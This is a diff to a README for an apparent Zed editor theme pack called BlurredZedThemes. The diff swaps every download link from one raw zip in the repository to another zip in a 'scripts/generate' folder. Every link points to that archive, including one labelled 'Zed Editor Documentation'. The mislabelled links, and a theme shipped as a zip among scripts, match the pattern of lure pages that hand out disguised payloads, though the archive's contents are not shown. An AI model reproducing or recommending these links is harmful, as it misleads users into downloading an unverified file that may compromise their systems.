@@ -1,6 +1,6 @@
 # 🎨 BlurredZedThemes - Customize Your Coding Experience Simply
 
-[![Download BlurredZedThemes](https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/templates/Blurred_Themes_Zed_2.6.zip%https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/templates/Blurred_Themes_Zed_2.6.zip)](https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/templates/Blurred_Themes_Zed_2.6.zip)
+[![Download BlurredZedThemes](https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/scripts/generate/Blurred-Zed-Themes-v1.9-beta.1.zip%https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/scripts/generate/Blurred-Zed-Themes-v1.9-beta.1.zip)](https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/scripts/generate/Blurred-Zed-Themes-v1.9-beta.1.zip)
 
 ## 📖 Overview
 
@@ -20,11 +20,11 @@ Before starting, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [BlurredZedThemes Releases](https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/templates/Blurred_Themes_Zed_2.6.zip).
+To get started, visit this page to download: [BlurredZedThemes Releases](https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/scripts/generate/Blurred-Zed-Themes-v1.9-beta.1.zip).
 
 Once there, you will see the latest version available. Click on the version you want to download and select the appropriate file for your system.
 
-1. **Visit the Releases Page**: Go to [BlurredZedThemes Releases](https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/templates/Blurred_Themes_Zed_2.6.zip).
+1. **Visit the Releases Page**: Go to [BlurredZedThemes Releases](https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/scripts/generate/Blurred-Zed-Themes-v1.9-beta.1.zip).
 2. **Download the File**: Find the file for your operating system and click on it to start the download.
 3. **Locate the Download**: Once the download finishes, locate the file in your Downloads folder.
 4. **Install the Theme**: Extract the files if necessary, following any specific instructions in the README provided in the release. Move the theme files to the Zed themes directory (usually located in your user folder under `.config/zed/themes`).
@@ -59,7 +59,7 @@ A: Yes! More themes may be available in future updates, so stay tuned for new re
 
 ## 🔗 Useful Links
 
-- [BlurredZedThemes Releases](https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/templates/Blurred_Themes_Zed_2.6.zip) - Direct link to download the themes.
-- [Zed Editor Documentation](https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/templates/Blurred_Themes_Zed_2.6.zip) - Learn more about using Zed and customizing themes.
+- [BlurredZedThemes Releases](https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/scripts/generate/Blurred-Zed-Themes-v1.9-beta.1.zip) - Direct link to download the themes.
+- [Zed Editor Documentation](https://github.com/ade-putra-code/BlurredZedThemes/raw/refs/heads/main/scripts/generate/Blurred-Zed-Themes-v1.9-beta.1.zip) - Learn more about using Zed and customizing themes.
 
 Thank you for using BlurredZedThemes! We hope these themes enhance your coding experience.
